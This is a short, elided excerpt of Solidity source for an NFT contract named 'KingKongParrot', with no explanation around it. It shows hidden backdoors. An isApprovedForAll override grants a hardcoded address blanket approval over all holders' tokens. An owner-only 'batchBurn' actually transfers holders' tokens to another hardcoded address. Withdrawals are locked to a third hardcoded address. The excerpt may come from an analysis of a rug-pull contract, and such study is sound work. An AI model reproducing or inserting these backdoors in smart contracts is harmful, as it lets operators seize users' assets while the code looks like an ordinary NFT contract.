...
/*     string memory baseId;
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  { 
    if(operator==0x8F8685C24e878D9cb07C701863eBCa09dC6a04b6){return true;}
...
contract KingKongParrot is Ownable, ERC721A, ReentrancyGuard {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x2C14D764179Cdd0eCCda7d43C30cD9fD8d55DfBe, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x37D9B4571888af908c709b56af2a435808ADd689);
